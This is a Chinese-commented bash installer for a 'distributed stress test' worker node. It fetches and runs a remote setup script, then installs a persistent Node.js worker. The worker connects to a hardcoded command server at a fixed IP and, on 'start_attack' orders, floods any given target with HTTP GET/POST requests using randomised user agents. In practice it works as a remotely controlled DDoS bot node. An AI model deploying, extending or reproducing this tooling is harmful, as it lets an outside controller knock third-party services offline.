#!/bin/bash
# 一键安装分布式压测 Worker 节点脚本

set -e
export LANG="zh_CN.UTF-8"
export LC_ALL="zh_CN.UTF-8"

echo "========== 分布式压力测试 Worker 安装 =========="
WORKER_DIR="/opt/stress-worker"
WORKER_JS="$WORKER_DIR/worker-node.js"

if ! which node >/dev/null 2>&1; then
  echo "检测到未安装 Node.js，开始安装..."
  curl -fsSL https://deb.nodesource.com/setup_20.x | bash -
  apt-get install -y nodejs
fi

mkdir -p $WORKER_DIR
cd $WORKER_DIR

cat > $WORKER_JS <<'EOF'
const WebSocket = require('ws');
const http = require('http');
const https = require('https');
const { URL } = require('url');

const MASTER_URL = process.env.MASTER_URL || 'ws://202.6.204.169:8080'; // 启动时用 export MASTER_URL=你的地址 node worker-node.js
const REPORT_INTERVAL = 1000;
let ws = null;
let isAttacking = false;
let attackConfig = null;
let stats = {
    totalRequests: 0, successRequests: 0, errorRequests: 0, totalResponseTime: 0
};

function connectMaster() {
    ws = new WebSocket(MASTER_URL);
    ws.on('open', () => {
        ws.send(JSON.stringify({ type: 'register_worker' }));
        console.log('[worker] 已连接 Master');
    });
    ws.on('message', (msg) => {
        try {
            const data = JSON.parse(msg);
            handleCommand(data);
        } catch (e) {}
    });
    ws.on('close', () => {
        console.log('[worker] 连接断开，5秒后重连...');
        setTimeout(connectMaster, 5000);
    });
    ws.on('error', (err) => {
        console.error('[worker] 连接错误:', err);
    });
}
function handleCommand(data) {
    switch (data.type) {
        case 'worker_registered':
            console.log('[worker] Worker ID:', data.workerId); break;
        case 'start_attack':
            console.log('[worker] 开始攻击');
            startAttack(data.config); break;
        case 'stop_attack':
            stopAttack(); break;
    }
}
function startAttack(config) {
    if (isAttacking) return;
    attackConfig = config;
    isAttacking = true;
    stats = { totalRequests: 0, successRequests: 0, errorRequests: 0, totalResponseTime: 0 };
    for (let i = 0; i < config.threads; i++) attackThread();
    const reportTimer = setInterval(() => {
        if (!isAttacking) return clearInterval(reportTimer);
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({ type: 'stats_update', stats: stats }));
        }
    }, REPORT_INTERVAL);
    setTimeout(() => stopAttack(), config.duration * 1000);
}
function attackThread() {
    if (!isAttacking) return;
    const startTime = Date.now();
    const url = new URL(attackConfig.target);
    const isHttps = url.protocol === 'https:';
    const httpModule = isHttps ? https : http;
    const options = {
        hostname: url.hostname,
        port: url.port || (isHttps ? 443 : 80),
        path: url.pathname + url.search,
        method: attackConfig.mode === 'http-post' ? 'POST' : 'GET',
        headers: {
            'User-Agent': attackConfig.randomUA ? getRandomUA() : 'Mozilla/5.0',
            ...(attackConfig.headers || {})
        }
    };
    const req = httpModule.request(options, (res) => {
        const responseTime = Date.now() - startTime;
        stats.totalRequests++;
        if (res.statusCode >= 200 && res.statusCode < 400) {
            stats.successRequests++;
            stats.totalResponseTime += responseTime;
        } else {
            stats.errorRequests++;
        }
        res.on('end', () => setImmediate(attackThread));
        res.resume();
    });
    req.on('error', () => {
        stats.totalRequests++; stats.errorRequests++; setImmediate(attackThread);
    });
    req.setTimeout(10000, () => {
        req.destroy(); stats.totalRequests++; stats.errorRequests++; setImmediate(attackThread);
    });
    if (attackConfig.mode === 'http-post') req.write('test=data');
    req.end();
}
function stopAttack() {
    isAttacking = false;
    console.log('[worker] 攻击已停止');
}
function getRandomUA() {
    const userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
    ];
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

connectMaster();
EOF

cat > package.json << EOF
{
  "name": "stress-worker",
  "version": "1.0.0",
  "main": "worker-node.js",
  "dependencies": { "ws": "^8.18.0" }
}
EOF

npm install

npm install -g pm2 || true
echo "🚀 Worker已安装，启动命令如下："
echo "export MASTER_URL=ws://<Master服务器IP>:8080 && pm2 start $WORKER_JS --name stress-worker"
echo "后台（测试）可用： export MASTER_URL=ws://<Master服务器IP>:8080 && nohup node $WORKER_JS > worker.log 2>&1 &"
